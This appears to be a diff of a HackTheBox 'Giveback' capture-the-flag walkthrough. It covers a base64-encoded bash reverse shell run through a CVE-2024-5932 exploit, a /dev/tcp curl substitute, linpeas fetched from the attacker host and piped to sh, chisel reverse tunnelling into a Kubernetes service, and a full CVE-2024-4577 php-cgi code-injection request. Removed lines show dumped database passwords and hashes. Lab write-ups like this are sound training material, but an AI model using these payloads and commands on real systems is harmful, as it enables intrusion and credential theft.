@@ -112,101 +112,135 @@ printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy80NDQ0IDA+JjEpICY=|base64 -d|bash
 └─$ python3 CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy80NDQ0IDA+JjEpICY=|base64 -d|bash"
 ```
 
+### Find internal service and port forwarding it to our local machine
 
-
+we can check our `id`:
 ```bash
-I have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/secrets/..2025_10_30_11_59_09.3808973577$ cat mariadb-password 
-sW5sp4spa3u7RLyetrekE4oSI have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/secrets/..2025_10_30_11_59_09.3808973577$   
-I have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/secrets/..2025_10_30_11_59_09.3808973577$ cat mariadb-root-password 
-sW5sp4syetre32828383kE4oSI have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/secrets/..2025_10_30_11_59_09.3808973577$ 
-I have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/secrets/..2025_10_30_11_59_09.3808973577$ cat wordpress-password 
-O8F7KR5zGiI have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/secrets/..2025_10_30_11_59_09.3808973577$ 
+I have no name!@beta-vino-wp-wordpress-755f57c9d8-lsbjl:/$ id
+uid=1001 gid=0(root) groups=0(root),1001
 ```
-mariadb:
+
+So, we have user id `1001` and also inside root group.
+Notice, there is no such user `1001` inside `/etc/passwd`
+
+![no such user](image.png)
+
+From the `env` and also the fact we can't execute almost nothing, super stripped environment, we can understand we're inside container, and there is `Kubernetes`.
+
+First, I got `curl` util from here [https://unix.stackexchange.com/a/421318](https://unix.stackexchange.com/a/421318).
 ```bash
-sW5sp4spa3u7RLyetrekE4oS
+function __curl() {
+  read -r proto server path <<<"$(printf '%s' "${1//// }")"
+  if [ "$proto" != "http:" ]; then
+    printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}"
+    return 1
+  fi
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [ "${HOST}" = "${PORT}" ] && PORT=80
+
+  exec 3<>"/dev/tcp/${HOST}/$PORT"
+  printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
+  (while read -r line; do
+   [ "$line" = $'\r' ] && break
+  done && cat) <&3
+  exec 3>&-
+}
 ```
-mariadb-root:
+
+Just paste it, now we can use `__curl` to get enumeration scripts, let's execute linpeas:
 ```bash
-sW5sp4syetre32828383kE4oS
+__curl http://10.10.16.188:8081/linpeas.sh | sh
 ```
-wordpress:
+and on the local machine:
 ```bash
-O8F7KR5zGiI
+python3 -m http.server 8081 -d ..
 ```
 
+![linpeas](image-1.png)
+
+inside the `env` output, we can see these lines:
 ```bash
-I have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/bitnami/wordpress$ cat wp-config.php 
-<?php
-/**
- * The base configuration for WordPress
- *
- * The wp-config.php creation script uses this file during the installation.
- * You don't have to use the website, you can copy this file to "wp-config.php"
- * and fill in the values.
- *
- * This file contains the following configurations:
- *
- * * Database settings
- * * Secret keys
- * * Database table prefix
- * * ABSPATH
- *
- * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
- *
- * @package WordPress
- */
-
-// ** Database settings - You can get this info from your web host ** //
-/** The name of the database for WordPress */
-define( 'DB_NAME', 'bitnami_wordpress' );
-
-/** Database username */
-define( 'DB_USER', 'bn_wordpress' );
-
-/** Database password */
-define( 'DB_PASSWORD', 'sW5sp4spa3u7RLyetrekE4oS' );
-
-/** Database hostname */
-define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );
+LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000                           
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000                                                                                                 
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241                                                                                                       
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000                               
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp                               
+LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241                              
+LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000                                     
+LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
 ```
+
+![legacy](image-2.png)
+
+Okay, I tried to `curl` to this internat service port:
 ```bash
-I have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/bitnami/wordpress$ mysql -h beta-vino-wp-mariadb -u bn_wordpress -p
+__curl http://10.43.2.241:5000/
 ```
 
-
-```sql
-MariaDB [bitnami_wordpress]> select * from wp_users;
-+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
-| ID | user_login | user_pass                          | user_nicename | user_email       | user_url         | user_registered     | user_activation_key | user_status | display_name |
-+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
-|  1 | user       | $P$Bm1D6gJHKylnyyTeT0oYNGKpib//vP. | user          | user@example.com | http://127.0.0.1 | 2024-09-21 22:18:28 |                     |           0 | babywyrm     |
-+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
-1 row in set (0.001 sec)
-```
-
-Then as root, with root password:
+It looks like there is some vulnerability in one of those endpoints:
 ```bash
-I have no name!@beta-vino-wp-wordpress-5c75b6d458-k2crp:/opt/bitnami/wordpress$ mysql -h beta-vino-wp-mariadb -u root -p
-```
-```sql
-MariaDB [(none)]> select Host,User,Password from mysql.user;
-+-----------+--------------+-------------------------------------------+
-| Host      | User         | Password                                  |
-+-----------+--------------+-------------------------------------------+
-| localhost | mariadb.sys  |                                           |
-| %         | root         | *4C01DD4201121A3DA72189DF846CC6E7ED7270D8 |
-| %         | bn_wordpress | *1714DA168E455FA1E36940992C2DB095868C0FBF |
-+-----------+--------------+-------------------------------------------+
-3 rows in set (0.003 sec)
+    <li><a href="/cgi-bin/info">/cgi-bin/info</a> — CGI Diagnostics</li>
+    <li><a href="/cgi-bin/php-cgi">/cgi-bin/php-cgi</a> — PHP-CGI Handler</li>
 ```
 
-Also execute `env`, get a lot of staff.
+![curl](image-3.png)
+
+We want to be able to explore it easily, so I'll use port forwarding, using [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel), based on this article [https://medium.com/@s12deff/port-forwarding-techniques-152fbc654636](https://medium.com/@s12deff/port-forwarding-techniques-152fbc654636).
+
+First, install `chisel` to your machine (if not installed yet):
+```bash
+curl https://i.jpillora.com/chisel! | bash
+```
+
+Next, upload the `chisel`, which is stand alone go compiled binary, to the remote machine, using the `__curl` we created.
+```bash
+__curl http://10.10.16.188:8081/chisel > /tmp/chisel; chmod +x /tmp/chisel
+```
+
+Lastly, execute on the local host:
+```bash
+chisel server --reverse -p 1234
+```
+
+and on the remote machine (forward to our ip, to port `5000`, from ip `10.43.2.241` and port `5000`): 
+```bash
+/tmp/chisel client 10.10.16.188:1234 R:5000:10.43.2.241:5000
+```
+
+![port forwarding](image-4.png)
+
+Now, we can easily access `http://127.0.0.1:5000/`, and get the Internal CMS System.
+
+![got the website](image-5.png)
+
 ### 
 
-Maybe this can help?? 
+I googled and find this exploit [https://github.com/AlperenY-cs/CVE-2024-4577](https://github.com/AlperenY-cs/CVE-2024-4577), it lets me get `RCE`.
 
-[https://www.practical-devsecops.com/lesson-4-hacking-containers-like-a-boss/](https://www.practical-devsecops.com/lesson-4-hacking-containers-like-a-boss/)
+we managed to get `RCE`:
+
+![RCE](image-6.png)
+
+full request:
+```bash
+POST /cgi-bin/php-cgi?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: curl/8.3.0
+Accept: /
+Content-Length: 23
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+<?php
+echo "1337";
+?>
+```
+
+Now, we want to send the payload for reverse shell from `penelope`.
+I tried to that, but for some reason I can't execute functions at all, don't know why ??
+
 
 ### Privilege Escalation to Root
 
